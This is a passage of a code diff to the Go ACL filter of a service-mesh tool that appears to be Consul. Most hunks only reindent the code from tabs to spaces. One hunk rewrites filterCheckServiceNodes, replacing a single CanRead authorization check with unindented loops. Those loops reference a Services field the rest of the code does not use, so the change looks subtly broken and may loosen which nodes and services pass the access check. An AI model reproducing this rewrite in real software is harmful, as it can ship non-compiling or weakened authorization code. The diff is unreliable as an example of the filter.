true\n-\t\t\tv.QueryMeta.ResultsFilteredByACLs = true\n-\t\t}\n-\n-\tcase *structs.DatacenterIndexedCheckServiceNodes:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterDatacenterCheckServiceNodes(&v.DatacenterNodes)\n-\n-\tcase *structs.IndexedCoordinates:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterCoordinates(&v.Coordinates)\n-\n-\tcase *structs.IndexedHealthChecks:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterHealthChecks(&v.HealthChecks)\n-\n-\tcase *structs.IndexedIntentions:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterIntentions(&v.Intentions)\n-\n-\tcase *structs.IndexedNodeDump:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterNodeDump(&v.Dump)\n-\n-\tcase *structs.IndexedServiceDump:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterServiceDump(&v.Dump)\n-\n-\tcase *structs.IndexedNodes:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterNodes(&v.Nodes)\n-\n-\tcase *structs.IndexedNodeServices:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterNodeServices(&v.NodeServices)\n-\n-\tcase *structs.IndexedNodeServiceList:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterNodeServiceList(&v.NodeServices)\n-\n-\tcase *structs.IndexedServiceNodes:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterServiceNodes(&v.ServiceNodes)\n-\n-\tcase *structs.IndexedServices:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterServices(v.Services, &v.EnterpriseMeta)\n-\n-\tcase *structs.IndexedSessions:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterSessions(&v.Sessions)\n-\n-\tcase *structs.IndexedPreparedQueries:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterPreparedQueries(&v.Queries)\n-\n-\tcase **structs.PreparedQuery:\n-\t\tf.redactPreparedQueryTokens(v)\n-\n-\tcase *structs.ACLTokens:\n-\t\tf.filterTokens(v)\n-\tcase **structs.ACLToken:\n-\t\tf.filterToken(v)\n-\tcase *[]*structs.ACLTokenListStub:\n-\t\tf.filterTokenStubs(v)\n-\tcase **structs.ACLTokenListStub:\n-\t\tf.filterTokenStub(v)\n-\n-\tcase *structs.ACLPolicies:\n-\t\tf.filterPolicies(v)\n-\tcase **structs.ACLPolicy:\n-\t\tf.filterPolicy(v)\n-\n-\tcase *structs.ACLRoles:\n-\t\tf.filterRoles(v)\n-\tcase **structs.ACLRole:\n-\t\tf.filterRole(v)\n-\n-\tcase *structs.ACLBindingRules:\n-\t\tf.filterBindingRules(v)\n-\tcase **structs.ACLBindingRule:\n-\t\tf.filterBindingRule(v)\n-\n-\tcase *structs.ACLAuthMethods:\n-\t\tf.filterAuthMethods(v)\n-\tcase **structs.ACLAuthMethod:\n-\t\tf.filterAuthMethod(v)\n-\n-\tcase *structs.IndexedServiceList:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterServiceList(&v.Services)\n-\n-\tcase *structs.IndexedExportedServiceList:\n-\t\tfor peer, peerServices := range v.Services {\n-\t\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterServiceList(&peerServices)\n-\t\t\tif len(peerServices) == 0 {\n-\t\t\t\tdelete(v.Services, peer)\n-\t\t\t} else {\n-\t\t\t\tv.Services[peer] = peerServices\n-\t\t\t}\n-\t\t}\n-\n-\tcase *structs.IndexedGatewayServices:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterGatewayServices(&v.Services)\n+        case *structs.PreparedQueryExecuteResponse:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterCheckServiceNodes(&v.Nodes)\n+\n+        case *structs.IndexedServiceTopology:\n+                filtered := f.filterServiceTopology(v.ServiceTopology)\n+                if filtered {\n+                        v.FilteredByACLs = true\n+                        v.QueryMeta.ResultsFilteredByACLs = true\n+                }\n+\n+        case *structs.DatacenterIndexedCheckServiceNodes:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterDatacenterCheckServiceNodes(&v.DatacenterNodes)\n+\n+        case *structs.IndexedCoordinates:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterCoordinates(&v.Coordinates)\n+\n+        case *structs.IndexedHealthChecks:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterHealthChecks(&v.HealthChecks)\n+\n+        case *structs.IndexedIntentions:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterIntentions(&v.Intentions)\n+\n+        case *structs.IndexedNodeDump:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterNodeDump(&v.Dump)\n+\n+        case *structs.IndexedServiceDump:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterServiceDump(&v.Dump)\n+\n+        case *structs.IndexedNodes:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterNodes(&v.Nodes)\n+\n+        case *structs.IndexedNodeServices:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterNodeServices(&v.NodeServices)\n+\n+        case *structs.IndexedNodeServiceList:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterNodeServiceList(&v.NodeServices)\n+\n+        case *structs.IndexedServiceNodes:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterServiceNodes(&v.ServiceNodes)\n+\n+        case *structs.IndexedServices:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterServices(v.Services, &v.EnterpriseMeta)\n+\n+        case *structs.IndexedSessions:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterSessions(&v.Sessions)\n+\n+        case *structs.IndexedPreparedQueries:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterPreparedQueries(&v.Queries)\n+\n+        case **structs.PreparedQuery:\n+                f.redactPreparedQueryTokens(v)\n+\n+        case *structs.ACLTokens:\n+                f.filterTokens(v)\n+        case **structs.ACLToken:\n+                f.filterToken(v)\n+        case *[]*structs.ACLTokenListStub:\n+                f.filterTokenStubs(v)\n+        case **structs.ACLTokenListStub:\n+                f.filterTokenStub(v)\n+\n+        case *structs.ACLPolicies:\n+                f.filterPolicies(v)\n+        case **structs.ACLPolicy:\n+                f.filterPolicy(v)\n+\n+        case *structs.ACLRoles:\n+                f.filterRoles(v)\n+        case **structs.ACLRole:\n+                f.filterRole(v)\n+\n+        case *structs.ACLBindingRules:\n+                f.filterBindingRules(v)\n+        case **structs.ACLBindingRule:\n+                f.filterBindingRule(v)\n+\n+        case *structs.ACLAuthMethods:\n+                f.filterAuthMethods(v)\n+        case **structs.ACLAuthMethod:\n+                f.filterAuthMethod(v)\n+\n+        case *structs.IndexedServiceList:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterServiceList(&v.Services)\n+\n+        case *structs.IndexedExportedServiceList:\n+                for peer, peerServices := range v.Services {\n+                        v.QueryMeta.ResultsFilteredByACLs = f.filterServiceList(&peerServices)\n+                        if len(peerServices) == 0 {\n+                                delete(v.Services, peer)\n+                        } else {\n+                                v.Services[peer] = peerServices\n+                        }\n+                }\n+\n+        case *structs.IndexedGatewayServices:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterGatewayServices(&v.Services)\n \n-\tcase *structs.IndexedNodesWithGateways:\n-\t\tif f.filterCheckServiceNodes(&v.Nodes) {\n-\t\t\tv.QueryMeta.ResultsFilteredByACLs = true\n-\t\t}\n-\t\tif f.filterGatewayServices(&v.Gateways) {\n-\t\t\tv.QueryMeta.ResultsFilteredByACLs = true\n-\t\t}\n-\t\tif f.filterCheckServiceNodes(&v.ImportedNodes) {\n-\t\t\tv.QueryMeta.ResultsFilteredByACLs = true\n-\t\t}\n+        case *structs.IndexedNodesWithGateways:\n+                if f.filterCheckServiceNodes(&v.Nodes) {\n+                        v.QueryMeta.ResultsFilteredByACLs = true\n+                }\n+                if f.filterGatewayServices(&v.Gateways) {\n+                        v.QueryMeta.ResultsFilteredByACLs = true\n+                }\n+                if f.filterCheckServiceNodes(&v.ImportedNodes) {\n+                        v.QueryMeta.ResultsFilteredByACLs = true\n+                }\n \n-\tdefault:\n-\t\tpanic(fmt.Errorf(\"Unhandled type passed to ACL filter: %T %#v\", subject, subject))\n-\t}\n+        default:\n+                panic(fmt.Errorf(\"Unhandled type passed to ACL filter: %T %#v\", subject, subject))\n+        }\n }\n \n // allowNode is used to determine if a node is accessible for an ACL.\n func (f *Filter) allowNode(node string, ent *acl.AuthorizerContext) bool {\n-\treturn f.authorizer.NodeRead(node, ent) == acl.Allow\n+        return f.authorizer.NodeRead(node, ent) == acl.Allow\n }\n \n // allowNode is used to determine if the gateway and service are accessible for an ACL\n func (f *Filter) allowGateway(gs *structs.GatewayService) bool {\n-\tvar authzContext acl.AuthorizerContext\n+        var authzContext acl.AuthorizerContext\n \n-\t// Need read on service and gateway. Gateway may have different EnterpriseMeta so we fill authzContext twice\n-\tgs.Gateway.FillAuthzContext(&authzContext)\n-\tif !f.allowService(gs.Gateway.Name, &authzContext) {\n-\t\treturn false\n-\t}\n+        // Need read on service and gateway. Gateway may have different EnterpriseMeta so we fill authzContext twice\n+        gs.Gateway.FillAuthzContext(&authzContext)\n+        if !f.allowService(gs.Gateway.Name, &authzContext) {\n+                return false\n+        }\n \n-\tgs.Service.FillAuthzContext(&authzContext)\n-\tif !f.allowService(gs.Service.Name, &authzContext) {\n-\t\treturn false\n-\t}\n-\treturn true\n+        gs.Service.FillAuthzContext(&authzContext)\n+        if !f.allowService(gs.Service.Name, &authzContext) {\n+                return false\n+        }\n+        return true\n }\n \n // allowService is used to determine if a service is accessible for an ACL.\n func (f *Filter) allowService(service string, ent *acl.AuthorizerContext) bool {\n-\tif service == \"\" {\n-\t\treturn true\n-\t}\n+        if service == \"\" {\n+                return true\n+        }\n \n-\treturn f.authorizer.ServiceRead(service, ent) == acl.Allow\n+        return f.authorizer.ServiceRead(service, ent) == acl.Allow\n }\n \n // allowSession is used to determine if a session for a node is accessible for\n // an ACL.\n func (f *Filter) allowSession(node string, ent *acl.AuthorizerContext) bool {\n-\treturn f.authorizer.SessionRead(node, ent) == acl.Allow\n+        return f.authorizer.SessionRead(node, ent) == acl.Allow\n }\n \n // filterHealthChecks is used to filter a set of health checks down based on\n // the configured ACL rules for a token. Returns true if any elements were\n // removed.\n func (f *Filter) filterHealthChecks(checks *structs.HealthChecks) bool {\n-\thc := *checks\n-\tvar authzContext acl.AuthorizerContext\n-\tvar removed bool\n-\n-\tfor i := 0; i < len(hc); i++ {\n-\t\tcheck := hc[i]\n-\t\tcheck.FillAuthzContext(&authzContext)\n-\t\tif f.allowNode(check.Node, &authzContext) && f.allowService(check.ServiceName, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tf.logger.Debug(\"dropping check from result due to ACLs\", \"check\", check.CheckID)\n-\t\tremoved = true\n-\t\thc = append(hc[:i], hc[i+1:]...)\n-\t\ti--\n-\t}\n-\t*checks = hc\n-\treturn removed\n+        hc := *checks\n+        var authzContext acl.AuthorizerContext\n+        var removed bool\n+\n+        for i := 0; i < len(hc); i++ {\n+                check := hc[i]\n+                check.FillAuthzContext(&authzContext)\n+                if f.allowNode(check.Node, &authzContext) && f.allowService(check.ServiceName, &authzContext) {\n+                        continue\n+                }\n+\n+                f.logger.Debug(\"dropping check from result due to ACLs\", \"check\", check.CheckID)\n+                removed = true\n+                hc = append(hc[:i], hc[i+1:]...)\n+                i--\n+        }\n+        *checks = hc\n+        return removed\n }\n \n // filterServices is used to filter a set of services based on ACLs. Returns\n // true if any elements were removed.\n func (f *Filter) filterServices(services structs.Services, entMeta *acl.EnterpriseMeta) bool {\n-\tvar authzContext acl.AuthorizerContext\n-\tentMeta.FillAuthzContext(&authzContext)\n+        var authzContext acl.AuthorizerContext\n+        entMeta.FillAuthzContext(&authzContext)\n \n-\tvar removed bool\n+        var removed bool\n \n-\tfor svc := range services {\n-\t\tif f.allowService(svc, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc)\n-\t\tremoved = true\n-\t\tdelete(services, svc)\n-\t}\n+        for svc := range services {\n+                if f.allowService(svc, &authzContext) {\n+                        continue\n+                }\n+                f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc)\n+                removed = true\n+                delete(services, svc)\n+        }\n \n-\treturn removed\n+        return removed\n }\n \n // filterServiceNodes is used to filter a set of nodes for a given service\n // based on the configured ACL rules. Returns true if any elements were removed.\n func (f *Filter) filterServiceNodes(nodes *structs.ServiceNodes) bool {\n-\tsn := *nodes\n-\tvar authzContext acl.AuthorizerContext\n-\tvar removed bool\n-\n-\tfor i := 0; i < len(sn); i++ {\n-\t\tnode := sn[i]\n-\n-\t\tnode.FillAuthzContext(&authzContext)\n-\t\tif f.allowNode(node.Node, &authzContext) && f.allowService(node.ServiceName, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tremoved = true\n-\t\tf.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node.Node, &node.EnterpriseMeta))\n-\t\tsn = append(sn[:i], sn[i+1:]...)\n-\t\ti--\n-\t}\n-\t*nodes = sn\n-\treturn removed\n+        sn := *nodes\n+        var authzContext acl.AuthorizerContext\n+        var removed bool\n+\n+        for i := 0; i < len(sn); i++ {\n+                node := sn[i]\n+\n+                node.FillAuthzContext(&authzContext)\n+                if f.allowNode(node.Node, &authzContext) && f.allowService(node.ServiceName, &authzContext) {\n+                        continue\n+                }\n+                removed = true\n+                f.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node.Node, &node.EnterpriseMeta))\n+                sn = append(sn[:i], sn[i+1:]...)\n+                i--\n+        }\n+        *nodes = sn\n+        return removed\n }\n \n // filterNodeServices is used to filter services on a given node base on ACLs.\n // Returns true if any elements were removed\n func (f *Filter) filterNodeServices(services **structs.NodeServices) bool {\n-\tif *services == nil {\n-\t\treturn false\n-\t}\n+        if *services == nil {\n+                return false\n+        }\n \n-\tvar authzContext acl.AuthorizerContext\n-\t(*services).Node.FillAuthzContext(&authzContext)\n-\tif !f.allowNode((*services).Node.Node, &authzContext) {\n-\t\t*services = nil\n-\t\treturn true\n-\t}\n+        var authzContext acl.AuthorizerContext\n+        (*services).Node.FillAuthzContext(&authzContext)\n+        if !f.allowNode((*services).Node.Node, &authzContext) {\n+                *services = nil\n+                return true\n+        }\n \n-\tvar removed bool\n-\tfor svcName, svc := range (*services).Services {\n-\t\tsvc.FillAuthzContext(&authzContext)\n+        var removed bool\n+        for svcName, svc := range (*services).Services {\n+                svc.FillAuthzContext(&authzContext)\n \n-\t\tif f.allowNode((*services).Node.Node, &authzContext) && f.allowService(svcName, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc.CompoundServiceID())\n-\t\tremoved = true\n-\t\tdelete((*services).Services, svcName)\n-\t}\n+                if f.allowNode((*services).Node.Node, &authzContext) && f.allowService(svcName, &authzContext) {\n+                        continue\n+                }\n+                f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc.CompoundServiceID())\n+                removed = true\n+                delete((*services).Services, svcName)\n+        }\n \n-\treturn removed\n+        return removed\n }\n \n // filterNodeServices is used to filter services on a given node base on ACLs.\n // Returns true if any elements were removed.\n func (f *Filter) filterNodeServiceList(services *structs.NodeServiceList) bool {\n-\tif services.Node == nil {\n-\t\treturn false\n-\t}\n+        if services.Node == nil {\n+                return false\n+        }\n \n-\tvar authzContext acl.AuthorizerContext\n-\tservices.Node.FillAuthzContext(&authzContext)\n-\tif !f.allowNode(services.Node.Node, &authzContext) {\n-\t\t*services = structs.NodeServiceList{}\n-\t\treturn true\n-\t}\n+        var authzContext acl.AuthorizerContext\n+        services.Node.FillAuthzContext(&authzContext)\n+        if !f.allowNode(services.Node.Node, &authzContext) {\n+                *services = structs.NodeServiceList{}\n+                return true\n+        }\n \n-\tvar removed bool\n-\tsvcs := services.Services\n-\tfor i := 0; i < len(svcs); i++ {\n-\t\tsvc := svcs[i]\n-\t\tsvc.FillAuthzContext(&authzContext)\n+        var removed bool\n+        svcs := services.Services\n+        for i := 0; i < len(svcs); i++ {\n+                svc := svcs[i]\n+                svc.FillAuthzContext(&authzContext)\n \n-\t\tif f.allowService(svc.Service, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n+                if f.allowService(svc.Service, &authzContext) {\n+                        continue\n+                }\n \n-\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc.CompoundServiceID())\n-\t\tsvcs = append(svcs[:i], svcs[i+1:]...)\n-\t\ti--\n-\t\tremoved = true\n-\t}\n-\tservices.Services = svcs\n+                f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc.CompoundServiceID())\n+                svcs = append(svcs[:i], svcs[i+1:]...)\n+                i--\n+                removed = true\n+        }\n+        services.Services = svcs\n \n-\treturn removed\n+        return removed\n }\n \n // filterCheckServiceNodes is used to filter nodes based on ACL rules. Returns\n // true if any elements were removed.\n func (f *Filter) filterCheckServiceNodes(nodes *structs.CheckServiceNodes) bool {\n-\tcsn := *nodes\n-\tvar removed bool\n-\n-\tfor i := 0; i < len(csn); i++ {\n-\t\tnode := csn[i]\n-\t\tif node.CanRead(f.authorizer) == acl.Allow {\n-\t\t\tcontinue\n-\t\t}\n-\t\tf.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node.Node.Node, node.Node.GetEnterpriseMeta()))\n-\t\tremoved = true\n-\t\tcsn = append(csn[:i], csn[i+1:]...)\n-\t\ti--\n-\t}\n-\t*nodes = csn\n-\treturn removed\n+csn := *nodes\n+var authzContext acl.AuthorizerContext\n+var removed bool\n+\n+for i := 0; i < len(csn); i++ {\n+node := csn[i]\n+node.Node.FillAuthzContext(&authzContext)\n+\n+// First, check if the node itself is readable. If not, then none of its\n+// services are either so we can just remove the whole node.\n+if !f.allowNode(node.Node.Node, &authzContext) {\n+f.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node.Node.Node, node.Node.GetEnterpriseMeta()))\n+removed = true\n+csn = append(csn[:i], csn[i+1:]...)\n+i--\n+continue\n+}\n+\n+// The user can see the node, now let's filter the services.\n+services := node.Services\n+for j := 0; j < len(services); j++ {\n+svc := services[j]\n+svc.FillAuthzContext(&authzContext)\n+if f.allowService(svc.Service, &authzContext) {\n+continue\n+}\n+\n+f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc.CompoundServiceID())\n+removed = true\n+services = append(services[:j], services[j+1:]...)\n+j--\n+}\n+csn[i].Services = services\n+}\n+\n+*nodes = csn\n+return removed\n }\n \n // filterServiceTopology is used to filter upstreams/downstreams based on ACL rules.\n // this filter is unlike others in that it also returns whether the result was filtered by ACLs\n func (f *Filter) filterServiceTopology(topology *structs.ServiceTopology) bool {\n-\tfilteredUpstreams := f.filterCheckServiceNodes(&topology.Upstreams)\n-\tfilteredDownstreams := f.filterCheckServiceNodes(&topology.Downstreams)\n-\treturn filteredUpstreams || filteredDownstreams\n+        filteredUpstreams := f.filterCheckServiceNodes(&topology.Upstreams)\n+        filteredDownstreams := f.filterCheckServiceNodes(&topology.Downstreams)\n+        return filteredUpstreams || filteredDownstreams\n }\n \n // filterDatacenterCheckServiceNodes is used to filter nodes based on ACL rules.\n // Returns true if any elements are removed.\n func (f *Filter) filterDatacenterCheckServiceNodes(datacenterNodes *map[string]structs.CheckServiceNodes) bool {\n-\tdn := *datacenterNodes\n-\tout := make(map[string]structs.CheckServiceNodes)\n-\tvar removed bool\n-\tfor dc := range dn {\n-\t\tnodes := dn[dc]\n-\t\tif f.filterCheckServiceNodes(&nodes) {\n-\t\t\tremoved = true\n-\t\t}\n-\t\tif len(nodes) > 0 {\n-\t\t\tout[dc] = nodes\n-\t\t}\n-\t}\n-\t*datacenterNodes = out\n-\treturn removed\n+        dn := *datacenterNodes\n+        out := make(map[string]structs.CheckServiceNodes)\n+        var removed bool\n+        for dc := range dn {\n+                nodes := dn[dc]\n+                if f.filterCheckServiceNodes(&nodes) {\n+                        removed = true\n+                }\n+                if len(nodes) > 0 {\n+                        out[dc] = nodes\n+                }\n+        }\n+        *datacenterNodes = out\n+        return removed\n }\n \n // filterSessions is used to filter a set of sessions based on ACLs. Returns\n // true if any elements were removed.\n func (f *Filter) filterSessions(sessions *structs.Sessions) bool {\n-\ts := *sessions\n+        s := *sessions\n \n-\tvar removed bool\n-\tfor i := 0; i < len(s); i++ {\n-\t\tsession := s[i]\n+        var removed bool\n+        for i := 0; i < len(s); i++ {\n+                session := s[i]\n \n-\t\tvar entCtx acl.AuthorizerContext\n-\t\tsession.FillAuthzContext(&entCtx)\n+                var entCtx acl.AuthorizerContext\n+                session.FillAuthzContext(&entCtx)\n \n-\t\tif f.allowSession(session.Node, &entCtx) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tremoved = true\n-\t\tf.logger.Debug(\"dropping session from result due to ACLs\", \"session\", session.ID)\n-\t\ts = append(s[:i], s[i+1:]...)\n-\t\ti--\n-\t}\n-\t*sessions = s\n-\treturn removed\n+                if f.allowSession(session.Node, &entCtx) {\n+                        continue\n+                }\n+                removed = true\n+                f.logger.Debug(\"dropping session from result due to ACLs\", \"session\", session.ID)\n+                s = append(s[:i], s[i+1:]...)\n+                i--\n+        }\n+        *sessions = s\n+        return removed\n }\n \n // filterCoordinates is used to filter nodes in a coordinate dump based on ACL\n // rules. Returns true if any elements were removed.\n func (f *Filter) filterCoordinates(coords *structs.Coordinates) bool {\n-\tc := *coords\n-\tvar authzContext acl.AuthorizerContext\n-\tvar removed bool\n-\n-\tfor i := 0; i < len(c); i++ {\n-\t\tc[i].FillAuthzContext(&authzContext)\n-\t\tnode := c[i].Node\n-\t\tif f.allowNode(node, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tf.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node, c[i].GetEnterpriseMeta()))\n-\t\tremoved = true\n-\t\tc = append(c[:i], c[i+1:]...)\n-\t\ti--\n-\t}\n-\t*coords = c\n-\treturn removed\n+        c := *coords\n+        var authzContext acl.AuthorizerContext\n+        var removed bool\n+\n+        for i := 0; i < len(c); i++ {\n+                c[i].FillAuthzContext(&authzContext)\n+                node := c[i].Node\n+                if f.allowNode(node, &authzContext) {\n+                        continue\n+                }\n+                f.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node, c[i].GetEnterpriseMeta()))\n+                removed = true\n+                c = append(c[:i], c[i+1:]...)\n+                i--\n+        }\n+        *coords = c\n+        return removed\n }\n \n // filterIntentions is used to filter intentions based on ACL rules.\n@@ -416,126 +438,126 @@ func (f *Filter) filterCoordinates(coords *structs.Coordinates) bool {\n // if the user doesn't have a management token. Returns true if any elements\n // were removed.\n func (f *Filter) filterIntentions(ixns *structs.Intentions) bool {\n-\tret := make(structs.Intentions, 0, len(*ixns))\n-\tvar removed bool\n-\tfor _, ixn := range *ixns {\n-\t\tif !ixn.CanRead(f.authorizer) {\n-\t\t\tremoved = true\n-\t\t\tf.logger.Debug(\"dropping intention from result due to ACLs\", \"intention\", ixn.ID)\n-\t\t\tcontinue\n-\t\t}\n+        ret := make(structs.Intentions, 0, len(*ixns))\n+        var removed bool\n+        for _, ixn := range *ixns {\n+                if !ixn.CanRead(f.authorizer) {\n+                        removed = true\n+                        f.logger.Debug(\"dropping intention from result due to ACLs\", \"intention\", ixn.ID)\n+                        continue\n+                }\n \n-\t\tret = append(ret, ixn)\n-\t}\n+                ret = append(ret, ixn)\n+        }\n \n-\t*ixns = ret\n-\treturn removed\n+        *ixns = ret\n+        return removed\n }\n \n // filterNodeDump is used to filter through all parts of a node dump and\n // remove elements the provided ACL token cannot access. Returns true if\n // any elements were removed.\n func (f *Filter) filterNodeDump(dump *structs.NodeDump) bool {\n-\tnd := *dump\n-\n-\tvar authzContext acl.AuthorizerContext\n-\tvar removed bool\n-\tfor i := 0; i < len(nd); i++ {\n-\t\tinfo := nd[i]\n-\n-\t\t// Filter nodes\n-\t\tinfo.FillAuthzContext(&authzContext)\n-\t\tif node := info.Node; !f.allowNode(node, &authzContext) {\n-\t\t\tf.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node, info.GetEnterpriseMeta()))\n-\t\t\tremoved = true\n-\t\t\tnd = append(nd[:i], nd[i+1:]...)\n-\t\t\ti--\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// Filter services\n-\t\tfor j := 0; j < len(info.Services); j++ {\n-\t\t\tsvc := info.Services[j].Service\n-\t\t\tinfo.Services[j].FillAuthzContext(&authzContext)\n-\t\t\tif f.allowNode(info.Node, &authzContext) && f.allowService(svc, &authzContext) {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc)\n-\t\t\tremoved = true\n-\t\t\tinfo.Services = append(info.Services[:j], info.Services[j+1:]...)\n-\t\t\tj--\n-\t\t}\n-\n-\t\t// Filter checks\n-\t\tfor j := 0; j < len(info.Checks); j++ {\n-\t\t\tchk := info.Checks[j]\n-\t\t\tchk.FillAuthzContext(&authzContext)\n-\t\t\tif f.allowNode(info.Node, &authzContext) && f.allowService(chk.ServiceName, &authzContext) {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tf.logger.Debug(\"dropping check from result due to ACLs\", \"check\", chk.CheckID)\n-\t\t\tremoved = true\n-\t\t\tinfo.Checks = append(info.Checks[:j], info.Checks[j+1:]...)\n-\t\t\tj--\n-\t\t}\n-\t}\n-\t*dump = nd\n-\treturn removed\n+        nd := *dump\n+\n+        var authzContext acl.AuthorizerContext\n+        var removed bool\n+        for i := 0; i < len(nd); i++ {\n+                info := nd[i]\n+\n+                // Filter nodes\n+                info.FillAuthzContext(&authzContext)\n+                if node := info.Node; !f.allowNode(node, &authzContext) {\n+                        f.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node, info.GetEnterpriseMeta()))\n+                        removed = true\n+                        nd = append(nd[:i], nd[i+1:]...)\n+                        i--\n+                        continue\n+                }\n+\n+                // Filter services\n+                for j := 0; j < len(info.Services); j++ {\n+                        svc := info.Services[j].Service\n+                        info.Services[j].FillAuthzContext(&authzContext)\n+                        if f.allowNode(info.Node, &authzContext) && f.allowService(svc, &authzContext) {\n+                                continue\n+                        }\n+                        f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", svc)\n+                        removed = true\n+                        info.Services = append(info.Services[:j], info.Services[j+1:]...)\n+                        j--\n+                }\n+\n+                // Filter checks\n+                for j := 0; j < len(info.Checks); j++ {\n+                        chk := info.Checks[j]\n+                        chk.FillAuthzContext(&authzContext)\n+                        if f.allowNode(info.Node, &authzContext) && f.allowService(chk.ServiceName, &authzContext) {\n+                                continue\n+                        }\n+                        f.logger.Debug(\"dropping check from result due to ACLs\", \"check\", chk.CheckID)\n+                        removed = true\n+                        info.Checks = append(info.Checks[:j], info.Checks[j+1:]...)\n+                        j--\n+                }\n+        }\n+        *dump = nd\n+        return removed\n }\n \n // filterServiceDump is used to filter nodes based on ACL rules. Returns true\n // if any elements were removed.\n func (f *Filter) filterServiceDump(services *structs.ServiceDump) bool {\n-\tsvcs := *services\n-\tvar authzContext acl.AuthorizerContext\n-\tvar removed bool\n-\n-\tfor i := 0; i < len(svcs); i++ {\n-\t\tservice := svcs[i]\n-\n-\t\tif f.allowGateway(service.GatewayService) {\n-\t\t\t// ServiceDump might only have gateway config and no node information\n-\t\t\tif service.Node == nil {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\n-\t\t\tservice.Service.FillAuthzContext(&authzContext)\n-\t\t\tif f.allowNode(service.Node.Node, &authzContext) {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\n-\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", service.GatewayService.Service)\n-\t\tremoved = true\n-\t\tsvcs = append(svcs[:i], svcs[i+1:]...)\n-\t\ti--\n-\t}\n-\t*services = svcs\n-\treturn removed\n+        svcs := *services\n+        var authzContext acl.AuthorizerContext\n+        var removed bool\n+\n+        for i := 0; i < len(svcs); i++ {\n+                service := svcs[i]\n+\n+                if f.allowGateway(service.GatewayService) {\n+                        // ServiceDump might only have gateway config and no node information\n+                        if service.Node == nil {\n+                                continue\n+                        }\n+\n+                        service.Service.FillAuthzContext(&authzContext)\n+                        if f.allowNode(service.Node.Node, &authzContext) {\n+                                continue\n+                        }\n+                }\n+\n+                f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", service.GatewayService.Service)\n+                removed = true\n+                svcs = append(svcs[:i], svcs[i+1:]...)\n+                i--\n+        }\n+        *services = svcs\n+        return removed\n }\n \n // filterNodes is used to filter through all parts of a node list and remove\n // elements the provided ACL token cannot access. Returns true if any elements\n // were removed.\n func (f *Filter) filterNodes(nodes *structs.Nodes) bool {\n-\tn := *nodes\n-\n-\tvar authzContext acl.AuthorizerContext\n-\tvar removed bool\n-\n-\tfor i := 0; i < len(n); i++ {\n-\t\tn[i].FillAuthzContext(&authzContext)\n-\t\tnode := n[i].Node\n-\t\tif f.allowNode(node, &authzContext) {\n-\t\t\tcontinue\n-\t\t}\n-\t\tf.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node, n[i].GetEnterpriseMeta()))\n-\t\tremoved = true\n-\t\tn = append(n[:i], n[i+1:]...)\n-\t\ti--\n-\t}\n-\t*nodes = n\n-\treturn removed\n+        n := *nodes\n+\n+        var authzContext acl.AuthorizerContext\n+        var removed bool\n+\n+        for i := 0; i < len(n); i++ {\n+                